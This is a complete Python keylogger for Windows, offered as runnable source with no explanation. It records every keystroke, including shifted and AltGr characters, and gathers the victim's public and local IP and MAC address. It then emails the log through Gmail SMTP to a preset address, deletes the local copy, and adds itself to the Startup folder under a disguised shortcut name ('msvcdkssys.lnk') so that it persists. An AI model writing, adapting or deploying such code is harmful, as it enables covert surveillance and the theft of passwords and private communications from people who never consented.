import smtplib
import time
import requests
import socket
import uuid
import json
import re
import platform
import os
import sys
import threading
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import winshell
from win32com.client import Dispatch

SENDER_EMAIL = 'Example@Example.com'
APP_PASWORD = 'AppPassword'
RECEIVER_EMAIL = 'Example@Example.com'

txt_file = "data.txt"
message_body = ""
last_key_time = 0 
send_timer = None

shift_pressed = False
alt_gr_pressed = False

alt_gr_map = {
    "q": "@", "1": ">", "2": "£", "3": "#", "4": "$", "5": "½", "6": "¾", "7": "{", "8": "[", 
    "9": "]", "0": "}", "e": "€", "a": "á", "s": "ß", "z": "ź", "c": "ç", "n": "ñ"
}

def reset_timer():
    global send_timer
    if send_timer:
        send_timer.cancel()
    
    os_info = platform.system()
    
    send_timer = threading.Timer(2, send_email, [message_body, os_info])
    send_timer.start()

def on_press(key):
    global message_body, last_key_time, shift_pressed, alt_gr_pressed
    try:
        if key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            shift_pressed = True
        elif key == keyboard.Key.alt_gr:
            alt_gr_pressed = True

        if hasattr(key, 'char') and key.char:
            char = key.char
            if shift_pressed or alt_gr_pressed:
                
                if alt_gr_pressed:
                    char = alt_gr_map.get(char, char) 
                elif shift_pressed:
                    if char == "1":
                        char = "!"
                    elif char == "2":
                        char = "'"
                    elif char == "3":
                        char = "^"
                    elif char == "4":
                        char = "+"
                    elif char == "5":
                        char = "%"
                    elif char == "6":
                        char = "&"
                    elif char == "7":
                        char = "/"
                    elif char == "8":
                        char = "("
                    elif char == "9":
                        char = ")"
                    elif char == "0":
                        char = "="
                    elif char == "-":
                        char = "_"
                    elif char == ".":
                        char = ":"
                    elif char == ",":
                        char = ";"
            message_body += char

        elif hasattr(key, 'name'):
            if key.name == 'space':
                message_body += " "
            elif key.name == 'enter':
                message_body += "\n"
            elif key.name == 'backspace':
                message_body = message_body[:-1]
        
        last_key_time = time.time()
        reset_timer()

    except Exception as e:
        print(f"Hata: {e}")
    finally:
        
        if key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            shift_pressed = False
        elif key == keyboard.Key.alt_gr:
            alt_gr_pressed = False

def get_public_ip():
    try:
        response = requests.get("https://api64.ipify.org?format=json", timeout=5)
        return response.json().get("ip", "unknown")
    except:
        return "no connection"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "unknown"

def get_mac_address():
    try:
        return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    except:
        return "unknown"

def send_email(body, os_info):
    global message_body
    if not message_body:
        return
    
    info = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "public_ip": get_public_ip(),
        "local_ip": get_local_ip(),
        "mac_address": get_mac_address(),
        "message": body,
        "os": os_info 
    }

    message_content = json.dumps(info, indent=2, ensure_ascii=False)
    
    
    with open(txt_file, "w", encoding="utf-8") as file:
        file.write(message_content)
    
    msg = MIMEMultipart()
    msg['From'] = SENDER_EMAIL
    msg['To'] = RECEIVER_EMAIL
    msg['Subject'] = "Keylogger Information"
    msg.attach(MIMEText("Keylogger Datas", 'plain', 'utf-8'))
    
  
    with open(txt_file, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename={txt_file}")
        msg.attach(part)
    
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(SENDER_EMAIL, APP_PASWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        print("E-posta gönderildi.")
        
       
        if os.path.exists(txt_file):
            os.remove(txt_file)
            print("TXT file was remove.")
    
    except Exception as e:
        print(f"E-mail send error: {e}")
    
    message_body = "" 

def add_to_startup():
    if platform.system() != "Windows":
        print("this process just for windows.")
        return
    
    startup_folder = winshell.startup()  
    script_path = os.path.abspath(sys.argv[0])  
    shortcut_path = os.path.join(startup_folder, "msvcdkssys.lnk")  
    
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = script_path
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.Description = "Kmsvcdkssys"
    shortcut.Save() 



add_to_startup()


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
